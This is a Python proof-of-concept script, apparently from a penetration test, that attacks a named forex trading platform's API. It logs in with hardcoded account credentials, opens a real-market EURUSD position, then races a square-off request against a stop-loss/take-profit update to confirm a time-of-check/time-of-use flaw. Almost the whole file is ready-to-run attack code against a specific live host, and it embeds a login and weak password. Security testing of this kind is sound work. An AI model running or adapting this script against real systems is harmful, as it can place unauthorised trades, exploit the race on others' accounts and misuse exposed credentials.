"""
BUG-22: SL/TP Modification After Position Close (Time-of-Check vs Time-of-Use)
Attack: Close a position, then IMMEDIATELY fire PUT /positions/{id}/protection 
        to see if stale SL/TP is accepted on a closed/non-existent position.
"""
import requests, threading, json, time

BASE_URL = "https://lpadmin.blackfx.com"

def make_session(email, password):
    s = requests.Session()
    s.post(f"{BASE_URL}/api/auth/login", json={"email": email, "password": password})
    t = s.post(f"{BASE_URL}/api/auth/chart-token").json().get("token")
    return s, {"Authorization": f"Bearer {t}", "Content-Type": "application/json"}

s_m, h_m = make_session("mamm@mailinator.com", "12345678")

# Open position
r = s_m.post(f"{BASE_URL}/v1/oms/real/orders", headers=h_m, json={
    "symbol": "EURUSD", "side": "BUY", "quantity": 0.01, "type": "MARKET"
})
print("Open EURUSD:", r.status_code, r.text[:200])
time.sleep(2)

pos_data = s_m.get(f"{BASE_URL}/v1/oms/real/positions", headers=h_m).json()
positions = pos_data.get("positions", [])
if not positions:
    print("No positions. Abort.")
    exit(1)

pos = positions[0]
mid = pos.get("market_order_id") or pos.get("id")
open_price = pos.get("open_price", 1.08)
print(f"Position ID: {mid}, open_price: {open_price}")

results = {}

def squareoff_pos():
    sq = s_m.post(f"{BASE_URL}/v1/oms/real/positions/{mid}/squareoff", headers=h_m)
    results["squareoff"] = {"status": sq.status_code, "body": sq.text[:300]}
    print(f"Squareoff: {sq.status_code} {sq.text[:200]}")

def set_protection():
    # Fire immediately — race with the squareoff
    prot = s_m.put(
        f"{BASE_URL}/v1/oms/real/positions/{mid}/protection",
        headers=h_m,
        json={"stop_loss": open_price - 0.01, "take_profit": open_price + 0.01}
    )
    results["protection"] = {"status": prot.status_code, "body": prot.text[:300]}
    print(f"Protection: {prot.status_code} {prot.text[:200]}")

# Fire both nearly simultaneously
t1 = threading.Thread(target=squareoff_pos)
t2 = threading.Thread(target=set_protection)
t1.start()
t2.start()
t1.join()
t2.join()

print("\n=== RESULTS ===")
print(json.dumps(results, indent=2))

sq_ok = results.get("squareoff", {}).get("status") == 200
prot_ok = results.get("protection", {}).get("status") == 200

if sq_ok and prot_ok:
    print("\n🚨 BUG-22 CONFIRMED: SL/TP accepted on closing/closed position (TOCTOU)!")
else:
    print(f"\nBUG-22 result: squareoff={results.get('squareoff',{}).get('status')}, protection={results.get('protection',{}).get('status')}")

# Check final state
time.sleep(1)
final = s_m.get(f"{BASE_URL}/v1/oms/real/positions", headers=h_m).json()
print("Final positions:", len(final.get("positions", [])))
print("Final balance:", final.get("funds", {}).get("balance"))
print("\nBUG-22 test complete.")
